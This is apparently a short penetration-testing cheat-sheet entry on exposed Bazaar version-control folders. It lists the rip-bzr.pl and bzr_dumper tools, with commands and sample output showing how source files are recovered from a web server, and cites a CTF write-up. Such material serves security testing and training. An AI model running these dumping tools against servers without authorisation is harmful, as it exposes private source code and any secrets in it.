# Bazaar

> Bazaar  (also known as bzr ) is a free, distributed version control system (DVCS) that helps you track project history over time and collaborate seamlessly with others. Developed by Canonical, Bazaar emphasizes ease of use, a flexible workflow, and rich features to cater to both individual developers and large teams.


## Summary

* [Tools](#tools)
    * [rip-bzr.pl](#rip-bzrpl)
    * [bzr_dumper](#bzr_dumper)
* [References](#references)


## Tools

### rip-bzr.pl

* [kost/dvcs-ripper/rip-bzr.pl](https://raw.githubusercontent.com/kost/dvcs-ripper/master/rip-bzr.pl)
    ```powershell
    docker run --rm -it -v /path/to/host/work:/work:rw k0st/alpine-dvcs-ripper rip-bzr.pl -v -u
    ```

### bzr_dumper

* [SeahunOh/bzr_dumper](https://github.com/SeahunOh/bzr_dumper)

```powershell
python3 dumper.py -u "http://127.0.0.1:5000/" -o source
Created a standalone tree (format: 2a)
[!] Target : http://127.0.0.1:5000/
[+] Start.
[+] GET repository/pack-names
[+] GET README
[+] GET checkout/dirstate
[+] GET checkout/views
[+] GET branch/branch.conf
[+] GET branch/format
[+] GET branch/last-revision
[+] GET branch/tag
[+] GET b'154411f0f33adc3ff8cfb3d34209cbd1'
[*] Finish
```

```powershell
bzr revert
 N  application.py
 N  database.py
 N  static/
```

## References

- [STEM CTF Cyber Challenge 2019 – My First Blog - m3ssap0 / zuzzur3ll0n1 - March 2, 2019](https://ctftime.org/writeup/13380)